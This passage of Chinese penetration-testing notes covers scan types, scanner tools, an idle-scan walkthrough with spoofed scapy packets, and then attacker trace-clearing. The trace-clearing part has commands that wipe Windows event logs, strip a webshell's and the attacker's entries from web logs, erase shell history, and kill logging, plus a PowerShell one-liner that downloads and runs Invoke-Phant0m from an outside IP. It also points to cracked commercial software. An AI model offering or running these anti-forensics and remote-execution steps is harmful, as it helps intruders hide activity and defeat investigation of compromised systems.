1.2 TCP反向ident扫描

2.半开放扫描
2.1 SYN扫描
2.2 IP头信息dump扫描

3.隐蔽扫描
3.1 FIN扫描
3.2 ACK扫描
3.3 空扫描
3.4 XMAS扫描
3.5 TCP分级
3.6 SYN ACK扫描

4.扫射扫描
4.1 ping扫射
4.2 UDP扫射
4.3 ACK扫射
4.4 SYN扫射
4.5 ICMP扫射

5.其他扫描
5.1 FTP弹跳
5.2 UDP/ICMP不可达
5.3 UDPrecvfrom/write扫描
```

```
1.TCP普通扫描方式

TCP ACK扫描：
这种方式往往用来探测防火墙的类型，根据ACK位的设置情况确定该防火墙是简单的包过滤还是状态检测机制的防火墙。

TCP 窗口扫描：
由于TCP 窗口大小报告方式不规则，所以这种扫描方法可以检测一些类似UNIX系统【AIX，FreeBSD】打开的端口，以及是否过滤的端口

TCP RFC扫描：
这种方式是UNIX_系统特有的，用于检测和定位远程过程调用【RPC】端口以及其相关程序与版本标号。
```

```
2. TCP扫描的高级扫描方式
修改TCP数据包中各标志位、就能得到TCP扫描的高级扫描方式，方法及原理如下

TCP connect扫描
这种类型是最传统的扫描技术，程序调用connect()接口函数连接到目标端口，形成一次完整的TCP“三次握手”过程，
显然能连接上的目标端口就是开放的瑞口.
(注意:在UNIX系统下使用TCP connect扫描方式不需要任何权限。)

TCP SYN扫描
这种类型也称为半开放式扫描。其原理是往目标端日发逆一个SIN包，
若得到来自目标瑞口返回的SYN/ACK响应包.则目标端口开放，若得到RST则未开放。
(注意:在UNIX下执行TOP SN扫描必须拥有ROOT权限.)
由于此类型并未建立完整的TCP“三次握手”过程，很少会有操作系统记录到，
因此比起TCP connect扫描隐蔽得多。虽然比类型招描隐蔽，但是有些防火墙监视TCP SYN扫描，
有些工具(如synlogger 和 .Courtney)也能够检测到它。
原因是:这种秘密扫描方式违反通例，在网络流量中相当醒目.

TGP FIN扫描
TCPFIN扫描的原理是:FFC793文档程序向一个端口发送FIN，若端口开放则此包被忽略，否则返回RST。
这个是某些操作系统TCP实现存在的BUG，并不是所有的操作系统都存在这个BUG,它的准确率不高，
而且此方法往往只能在UNIX系统上成功工作，因此这种扫描方法不是特别流行。
它的好处在于足够隐蔽，如果判断在使用TCP SYN扫描时可能暴露自身则可以试-试这种方法。

TCP reverse ident扫描
ident协议允许退过TCP连接得到选程所有者的用户名，即使该进程不是连接发起方.
此方法用于得到FTP所有者信息，以及其他需要的信息等。

TCP Xmas Tree扫描
该程序往目标端口发送一个FIN、URG和PUSH包。若其关闭.应该返回一个RST包.

TCP NULL扫描
该程序发送--个没有任何标志位的TCP包，关闭的端口将返回一个RST数据包。
```

```
3. UDP扫描方式和其他扫描方式
对于UDP端口的扫描，通常采用以下方法

UDP ICMP端口不可达扫描
此方法是利用UDP本身是无连接的协议，所以一个打开的UDP端口并不会返回任何响应包.
如果端口关闭，某些系统将返回ICMP_PORT UNEACH信息，由于UDP是不可靠的非面向连接协议，
所以这种扫描方法容易出错，还比较慢。

UDP recvfrom()和write()扫描
由于UNIX系统下非ROOT用户无法读到端口不可达信息，所以MAP提供这个仅Linux下才有效的方式。
在Linux下，若一个UDP端口关闭，则第二次write()操作会失败。
当调用recvfrom()时.若未收到ICMP的错误信息.一个非阻塞的UDP套接字一般返回EAGAIN("Try Again",crror=13 ) ;
如果收到ICMP的错误信息，套接字返回ECONNREFUSED("Connectionrefused" error=11).
通过这种方式，NMAP将得知目标端口是否打开。

其他扫描方式
除典型的TCP和UDP扫描方式外，还有--些另类的扫描方式:分片扫描;FTP跳转扫描。
```

### 3.1.3 扫描器扫描前的准备工作

```
1.了解网络部暑情况
了解哪些网络主机是可以进行扫描的，哪些网络主机是不可以进行招缄，
避免影啊止常网络通讯业务，造成网络瘫痪。

2.扫描时间和方式
建议不要在白天业务繁忙情况进行扫描，尽量安排在夜里业务量较低时，选择合理的方式进行扫描。·定制好扫描策略
可以针对的性的是扫描服务器漏洞，服务器端口，或是弱口令探测等等。

3.防火墙是否开启
确认防火墙是否开启，某些扫描策略在防火墙开启时是扫描不到任何信息的

4.企业服务是否配置了相关的安全策略,以防锁死(注意)
企业中常遇到的一个问题，有些业务服务是由扫描探测锁定限制的，
一旦扫描可能会造成业务中断。比如数据库业务。
```

### 3.1.4 常见扫描工具

```
nessus
nikto(kali自带)
skipfish
awvs
nmap

SuperScan
Fluxay(流光)
X-Scan
MBSA(微软)
Wikto
NMAP
天境(启明)
极光(绿盟)


web扫描工具
AWVS, APPSCAN,Netsparker,绿盟科技WVSS,安恒明鉴扫描器

系统扫描工具
天境,nessus,nmap(端口扫描)

其他扫描工具
burp(万能神器)
```

## 3.2 扫描技术应用实战

### 3.2.1 检测系统主机安全方法(windows)

```
1.X-Scan扫描工具使用介绍
由国内“安全焦点”出品的漏洞检测工具，主要针对指定主机或IP地址段进行安全检测，
并针对扫描结果提供漏洞描述、风险等级汗估等内容，方便安全工作人员及时采取补救措施。
采用多线程方式对指定IP地址段(或单机)进行安全漏洞检测，支持插件功能。

扫描内容包括:
远程股务类型、操作系统类型及版本，各种弱口令漏洞、后门、应用服务漏洞、网络设备漏洞、
拒绝股务漏洞等二十几个六类。对于多数已知漏洞，我们给出了相应的福洞描述、
解决方燕及详细描达链接，其它漏洞资料正在进一步整理完善中，
您也可以通过本站的“安全文摘”和“安全漏洞”栏目查阅相关说明。

3.0及后续版本提供了简单的插件开发包，便于有编程基础的朋友自己编写
或将其他调试通过的代码修改为X-Scan插件。

操作配置过程:
第一步:设置扫描参数信息，定义扫描的地址范围
【设置】-【扫描参数】-【指定IP范围】
第二步:设置扫描系统信息小工具
【工具】-选择需要获取扫描的信愈
```

```
2.Nessus扫描工具使用介绍
Nessus的thome版是免费的，但是一次性只能扫描16个IP地址，
如果渗透测试的目标IP很多的话，建议使用企业购买的Nessus商业版，
商业版的Nessus可扫描的IP地址数是unlimited(没有限制）的。

目前排名在黑客工具排行榜第三位(https://sectools.org/)
软件官方网址: 
https://zh-cn.tenable.com/products/nessus?tns_redirect=true
```

```
3. Nexpose扫描工具使用介绍
也是一款网络安全业界常用的一-款漏洞扫描工具
官方网站地址: https: // www.rapid7.com/ products/nexpose/
软件安装部署方式有两种
一种是下载软件程序进行安装部署，但要部署在linux系统中
另一种方式是直接下载ova系统镜像文件
软件下载地址
https://www.rapid7.com/products/nexpose/
镜像文件地址：
http://download2.rapid7.com/download/NeXpose-v4/NexposeVA.ova

软件部署内存至少8G，推荐16G
```

```
4.天镜(启明星辰)
```

### 3.2.2 检测web服务业务安全漏洞

```
1.AppScan扫描工具使用介绍
AppScan是web应用程序渗透测试毋台上使用最广泛的工具之一，它是一个桌面应用程序，
它有助于专业安全人员进行web应用程序自动化脆弱性评估。
AppScan其实是一个产品家族，包括众多的应用安全扫描产品，从开发阶段的源代码扫描的AppScansource edition，
到针对web应用进行快速扫描的AppScan standard edition以及进行安全管理和汇总整合的AppScan enterprise Editian等，
经常说的AppScan就是指桌面版本的AppScan，即AppScan standard edition其安装在windows操作系统上。
可以对网站等WEB应用进行自动化的应用安全扫描和测试。

部署安装指南:
win7+Microsoft.NET Framework 4.5+AppScan安装包，此工具属于收费工具，具体破解请自行研究。

安装过程说明:
·关闭任何已打开的Mircrosoft office应用程序
·启动AppScan安装程序
·安装向导指示信息完成AppScan安装

安装破解过程:
AppScan安装中包含一个缺省许可证，此许可证允许担描IBM定制设计的测试站点（demo. testfire. net),
但不允许扫描其他站点，为了扫描自己的站点，必须安装IBM提供的有效许可证。
有三种类型的许可证:
浮动许可证, 令牌许可证, 节点锁定许可证
利用许可文件，进行激活破解软件程序。
```

```
2.AWVS(Acunetix)
推荐使用
```

```
3.NetSparker
Netsparker是一个应用程序安全测试解决方案，它使团队能够自信地自动化并立即解决风险

专为现代Web设计的安全性
昨天的工具不适用于当今的网络。
Netsparker会自动爬网和扫描所有类型的旧版和现代Web应用程序，
因此您可以跟上不断发展的技术，并阻止安全隐患滑入雷达。

可靠，可靠的风险检测
Netsparker独有的基于证明的扫描系统可以为您验证潜在的漏洞，
将繁琐的手动工作从您的团队中解放出来，使他们可以专注于最重要的事情。

从第一天获得结果
Netsparker的创建是为了容纳现成的现有工具和工作流，
因此您可以轻松设置并将可靠的安全性作为过程的一部分-无需其他程序或硬件。

报告您的组织需求
Netsparker的内置报告工具使您可以控制数据。
借助可自定义的报告和清晰的可视化仪表板，您可以轻松跟踪趋势，隔离需要改进的区域并优化流程。

官方链接:https:/www.netsparker.com/?ab=v1
破解版本:https:/www.ddosi.com/b162
```

```
4.HP_webinspect扫描工具使用介绍

新版本可能无破解版，并且比较占用资源，建议不要安装在本机，尽量部署到服务器环境中。
HP_webinspect 10.30是一款文件大，系统资源占用更大的扫描软件，
在安装后开机会自动启动种类繁多的服务和进程，
尽量将webinspect安装在单独的虚拟机中，
分配内存在3GB以上;
确保操作系统windows7及以上;
并确保支持Net. ranework 4.5 x和SQL Server2012，
开启前还需运行service.msc工具检查SQL和webinspect系列服务是否全部正确启动
以防扫描时出现致命错误中断:
10.30版本的下载和升级可能需要VPN。
```

```
5.绿盟web扫描测试工具介绍
参见绿盟web扫描手册信息·
```

```
6.Burp suite web扫描工具
Burp suite是web应用程序测试的最佳工具之一，其多种功能可以帮助我们执行各种任务，
包括数据包请求拦截与修改、扫描web应用程序漏洞，以及暴力破解登录菜单，
执行会话令牌等多种的随机性检查。

由于Burpsuite功能强大，各项参数十分复杂，下面只着重看关于软件的主要功能
，更多细节见官方网站。由于burp的强大性，主要分为以下几个模块讲解

Target(目标)
渗透测试的目标URL. 

Proxy(代理)
burp使用代理，默认端口为8080，使用此代理，
我们可以截获并修改从客户端到web应用程序的数据包

Spider(抓取)
其功能是用来抓取web应用程序的缝接和内容等，它可以扫描出闪站上的所有链接，
通过这些链接的详细扫描来发现web应用程序的漏洞

Scanner (扫描器)
主要用来扫描web应用程序的漏洞

Intruder (入侵)
此模块有多种功能，如漏洞利用，web应用程序模糊测试，暴力破解等. 

Repeater (中集器)
重放，用来模拟数据包的请求与响应过程。

sequencer
此功能主要用来检查web应用程序提供的会话令牌的随机性，并执行各种测试

Decoder（解码）
解码和编码

comparer(比较)
比较数据包之间的异同

Extender (扩展)
burp的一些高级功能

option (选项)
burp通用设置选项

Alerts(警告)
burp的一些状态提示
```

### 3.2.3 评估网络中的漏洞与弱点

### 3.2.4 针对弱口令的扫描入侵

### 3.2.5 企业漏洞扫描报告撰写

## 3.99 僵尸扫描

### 3.99.1 相关概念

```shell
做渗透最重要是什么?思维!
学僵尸扫描实用性不大，但是僵尸扫描的这个种思维值得你学习。

僵尸主机:
僵尸主机是指感染僵尸程序病毒，从而被黑客程序控制的计算机设备。
但是僵尸扫描中的僵尸主机指得是一个闲置的操作系统(这里的闲置是指主机不会主动和任何人通信)，
且此系统中IР数据包中ID是递增的。
僵尸扫描拥有极高的隐蔽特性，但是实施条件苛刻。
1.目标网络可伪造源地址进行访问
2.选择僵尸机，僵尸机需要在互联网上是一个闲置的操作系统，
需要系统使用递增的IPID，比如XP系统。

#思考：
nmap和ping 都会直接和目标机器接触。
如何可以不直接目标主机接触，还可以探测出目标主机是否开放端口?
黑客-->远程连接上代理/肉鸡-->代理/肉鸡远程执行nmap/ping-->扫描目标主机

#前提是:
你在公网或局域网上先拿到了肉机。
僵尸扫描可以不拿到肉机权限，只要对方的IPID是自增长上的就可以了。
```

### 3.99.2 僵尸扫描的原理

```shell
#第一步:参考图1。
(1)攻击者向僵尸机发送SYN/ACK确认包。
(2)僵尸主机返回我们RST 数据包关闭链接，RST数据包中包含了IPID信息。假设IPID=X.
注:三次握手的第一个包是SYN，目标主机收到SYN才会应答SYN/ACK，
因为僵尸主机没有向我们发送SYN请求，所以僵尸主机返回我们RST 数据包关闭链接。
第一步中，黑客的收获是:知道了僵尸主机的IPID。

#第二步:参考图2。
(1)攻击者修改IP包头的SRC 字段为僵尸主机的IP，伪装成僵尸主机给目标主机发SYN请求。
(2)目标主机收到请求，如果端口是开放的就会返回给僵尸主机一个SYN/ACK的数据包。
(3)僵尸主机收到目标主机发来的SYN/ACK确认包，因为僵尸主机没有给你发SYN请求。
所以僵尸主机给目标主机返回了一个RST 数据包。这个数据包表示关闭连接。
此僵尸主机对外发出一个数据包，所以僵尸主机的IPID值+1。此时IPID值为+1。
第二步中，黑客的收获是:如果目标主机端口开放，让僵尸主机的IPID+1。

#第三步:参考图3。
(1)攻击者再次向僵尸主机发送SYN/ACK确认包。
(2)僵尸主机同样向攻击者返回了一个RST数据包，此僵尸主机对外又发出一个数据包，
所以僵尸主机的IPID值再+1。此时IPID值为X+2。

#第四步:计算3次通信过中的IPID值。
(1)攻击者查看僵尸主机返回的数据包中IPID值为X+2。
(2)攻击者对比在第一步中的IPID值X，发现增加了2。 
结论:肯定目标主机和僵尸主机通信了，能通信，就说明目标主机端口是开放的。
如果发现返回的IPID值只增加了1，则说明目标主机端口是关闭的。
```

### 3.99.3 僵尸扫描实战(使用scapy)

```shell
#第一步:给僵尸主机发送的SYN/ACK数据包，将返回的数据包存入rz1
在kali中输入scapy，然后输入：
rz1=sr1(IP(dst="192.168.1.54")/TCP(dport=445,flags="SA"))
命令详解:
rz1表示定义了一个变量来接受我们返回的数据包
dst表示我们的僵尸主机IP
dport=445表示我们向僵尸主机的445端口发送数据包，XP主机的445端口一般都是开启状态
flags= “SA”表示发送SYN/ACK

然后查看一下IPID
display()表示查看变量中的内容。
我们只需要查看IP下面的ID字段即可
>>> rz1.display()

#第二步
攻击者修改IP包头的SRC字段为僵尸主机的IP，伪装成僵尸主机给目标主机发SYN请求。
rt=sr1(IP(src="192.168.1.54",dst="192.168.1.63")/TCP(dport=22),timeout=1)
命令详解
rt表示定义了一个变量来接受我们返回的数据包
src表示伪造成僵尸主机的IP地址
dst表示将数据包发送目标主机
dport目标端口
timeout超时时间

然后查看一下IPID
display()表示查看变量中的内容。
我们只需要查看IP下面的ID字段即可
>>> rt.display()

#第三步:
攻击者再次向僵尸主机发送 SYN/ACK确认包，获得IPID
rz2=sr1(IP(dst="192.168.1.54")/TCP(dport=445,flags="SA"))
然后查看一下IPID
display()表示查看变量中的内容。
我们只需要查看IP下面的ID字段即可
>>> rz2.display()
```

### 3.99.4 僵尸扫描实战(使用nmap)

# 4.痕迹清除 (挂多重代理or使用隧道or使用受控电脑访问)

```shell
在渗透测试过程中，日志往往会记录系统上的敏感操作，如添加用户，远程登录，执行命令等。
攻击日志进行清除和绕过。(但是如果日志上了日志服务器，是很难以清除的，要挂代理来绕过)
```

## 4.1 windows 痕迹清除

### 4.1.1 windows 日志

```shell
1.查看日志：事件查看器-->windows日志
win+r --> eventvwr.msc

2.日志保存路径：
C:\Windows\System32\winevt\Logs

3.日志分类:
应用程序、安全、Setup、系统、转发事件
3.1 系统日志: System
记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。
3.2 应用程序日志: Application
包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件,
例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。
3.3 安全日志: Security
记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、
特权使用、帐号管理、策略变更、系统事件。
安全日志也是调查取证中最常用到的日志。

4.Windows日志清理
wevtutil.exe
用于检索有关事件日志和发布者的信息，安装和卸载事件清单，运行查询以及导出、存档和清除日志。
wevtutil cl security
wevtutil cl system
wevtutil cl application
wevtutil cl "windows powershell"

5.其他命令
#统计日志列表，查询所有日志信息，包含时间，数目
wevtutil.exe gli Application
#查看指定类别的日志内容
wevtutil qe Application /f:text
#删除该类日志所有内容
wevtutil cl Application
#获取security的最近十条日志
wevtutil qe Security /f:text /rd:true /c:10

6.meterpreter清理日志
删除所有在渗透过程中使用的工具
#删除之前添加的账号: 
net user username /del
#分别清除了应用程序，系统和安全模块的日志记录
删除应用程序、系统和安全日志: clearev
#关闭所有的Meterpreter连接: 
sessions -K
#查看事件日志
run event_manager -i
#删除事件日志
run event_manager -c

7.停止日志记录
利用脚本让日志功能失效，无法记录日志
7.1 方案1 直接去github下载 Phant0m
7.2 方案2 远程加载(记得要更换成自己的ip)
powsershell "IEX(new-object system.net.webclient)
.downloadstring('http://39.108.68.207:8000/Invoke-Phant0m.ps1');
Invoke-Phant0m"
7.3 推荐方案
渗透前：右下角-->任务管理器-->找到EventLog对应的svchost进程结束掉。
渗透后：重新开启windows event log服务即可恢复日志记录。
```

## 4.2 linux痕迹清除

### 4.2.1 清除登录日志

```shell
#1.查看ssh远程登录会产生登录日志
命令的输出包括:登录名，上次登录时间，IP地址，端口等。
命令        日志文件            描述
last        /var/log/wtmp     所有成功登录/登出的历史记录
lastb       /var/log/btmp     登录失败尝试记录
lastlog     /var/log/lastlog  最近登录记录
w,who       /var/run/utmp     记录当前登录的每个用户的信息，
它只保留当时连接的用户记录，不会永久保存

#2.清理
last等日志是二进制文件，无法直接修改。所以清除的最简单方式是清空日志文件本身。
清空lastb对应的/var/log/btmp文件需要root权限
echo '' > /var/log/wtmp
echo '' > /var/log/btmp
echo '' > /var/log/lastlog
```

### 4.2.2 清除web日志

```shell
#1.查看日志，也可能不在下述目录，此外还有其他web服务器，比如tomcat,undertown等
/var/log/httpd/access.log
/var/log/nginx/access.log
/var/log/apache2/access.log

#2.日志清理
cat /var/log/nginx/access.log l grep -v shell.php > /tmp/a.logcat /tmp/a.log > /var/log/nginx/access.log
#第一条删除所有包含shell.php这个字符
sed -i -e ' /shell.php/d' /var/log/httpd/access.log
#第二条删除包含123.123.123.123这个字符串(我们自己的IP)的行.
sed -i -e "/192.\168.\13.\12/d" /var/log/httpd/access.log
```

### 4.2.3 清除定时任务日志

```shell
1.查看记录了系统定时任务相关的日志
/var/log/cron

2.清除
```

### 4.2.4 secure日志

```shell
1.查看
/var/log/secure
记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，
比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中。

2.清除
```

### 4.2.5 history记录

```shell
#显示历史记录
history
#历史记录文件
~/.bash_history

#删除全部历史记录: 
history -w && history -c && > .bash_history
#删除指定行的历史记录: 
history -d 123
#备份还原历史记录: 
cp .bash_history his.txt
#删除100行以后的历史记录: 
sed -i "100,$d" .bash_history
```

### 4.2.6 隐藏历史记录

```shell
#开启无痕模式，禁用命令历史记录功能。
set +o history
#恢复
set -o history
```

# 95.安全加固

```python
百度搜索，linux系统安全加固，windows系统安全加固等等
```

# 96.等级保护

## 96.1 等保发展历程

```python
1994首次国家提出等级保护概念
1999针对信息系统保护有法律依据. 
2007等保1.0措施。
2017立法了《网络安全法》
2019年等保2.0颁布
```

[网络安全等级保护网](http://www.djbh.net/webdev/web/HomeWebAction.do?p=init)

## 96.2 如何做等保

```python
关键性角色:
1.公安机关网监部门:主要承担等级保护过程中的监督检查的工作，负责管理测评机构。
个测评机构都需要在当地进行备案。
2.测评机构:各省分布大概3-6个公安备案测评机构，
主要负责根据当地网监部门的要求开展测评工作。
3.被测评企业:根据网监部门要求，配合等保相关工作
4.集成商、实施商、安全厂商:被测评企业需要根据整改方案进行整改，
大量的涉及到安全设备的采购与应用.
```

## 96.3 等级保护的流程

```python
定级备案--->差距评估--->整改建设--->等级评测
1.定级备案
梳理信息系统情况，确定等级，提交定级报告和备案表到当地网监部门。
一级到五级
2.差距评估
差距评估报告，整改建议，渗透测试报告
3.安全整改
系统安全、网络安全、数据安全
4.等级评测
```

# 97.网站常见的攻击方式

## 97.1 网站中出现大量的黑链

    网站看着正常, 但是里面有很多隐藏的链接
    黑链的可能特点是: 字体大小是0, 或者极限偏移

## 97.2 网站的根目录中出现大量的植入网页

    1.网站没有好好维护
    2.网站存在上传/下载漏洞
        zip压缩炸弹
            一个zip包4kb, 解压后有若干GB或者 若干PB
    3.网站目录内容暴增(递归操作)
    4.一些大型网站更容易受攻击(流量大, 攻击价值高)
    5.植入的网页通常都是一些广告,博彩,色情等等网页

## 97.3 网站网页挂马

    私服网页(比如游戏私服)
    XSS攻击

## 97.4 网站服务器被植入蠕虫病毒

    网站服务器运行缓慢
    比如从非官网下载了一些运维工具或者第三方插件
    出现挖矿脚本
    由于网站漏洞导致服务器被控制, 服务器就成为了肉鸡
        DDOS

## 97.5 网站域名DNS劫持

    现象是: 打开自己的网站跳转到了非自己的网站上
    自己的服务器和网站都没问题
    ping 自己的服务器返回的不是网站ip

## 97.6 网站和服务器密码被篡改

    SSH暴力破解(SSH, 22端口)
    远程连接(3389端口)
    通过漏洞来整(如, 永恒之蓝)

## 97.7 网站数据库被植入内容

    勒索病毒: 锁库, 锁表

## 97.8 DDOS攻击

    操纵肉鸡进行攻击
    游戏公司, 博彩行业等

## 97.9 非法桥页

    网站打开后跳转到指定的页面上
    网页中植入了非法js
    Apache, tomcat, IIS, Nginx

# 98.网站攻击的目的

```shell
利用漏洞进行：
攻击
防御绕过
维持访问(后渗透攻击)
```

## 98.1 非法植入链接

## 98.2 获取流量

    澳门新葡京
        赌博背后产业链
    网贷平台
        贷款背后产业链
    色情
        色情背后产业链
    电影
        电影背后产业链
    纯广告
        广告背后产业链
    挖矿(区块链技术)
        获取CPU/GPU处理加密货币相关工作
            主要用于解密
            会中挖矿病毒/服务器病毒/CPU 100%
            一般服务器/PC/手机都可能中毒
            原理是: 有一个矿池(服务器): 与中毒的客户端通信, 派送任务
            防范方式: 禁用掉该域名或者ip地址

## 98.3 获取个人信息

    用户名
    密码
    姓名
    邮箱账号

## 98.4 盗号, 钓鱼, 获取键盘记录

## 98.5 获取系统权限

# 99. 网站攻击防护

## 99.1 后台监控

    监控CPU或者内存占用比较高的
    挖矿/蠕虫/fork炸弹/深层递归/

## 99.2 排查周期性的定时任务

```shell

```

## 99.3 排查不必要的服务

```shell
#1.定期扫描主机上存活的端口(如果有异常端口，请关闭，以免被留了后门)
nmap -p1-65535 192.168.13.128

#2.查看端口对应的PID(比如某存活端口为9093)
lsof -i:9093

#3.查看PID对应的服务
ps -aux | grep PID

#4.分析
如果发现有问题，则排查后关闭对应进程。
kill -9 PID
```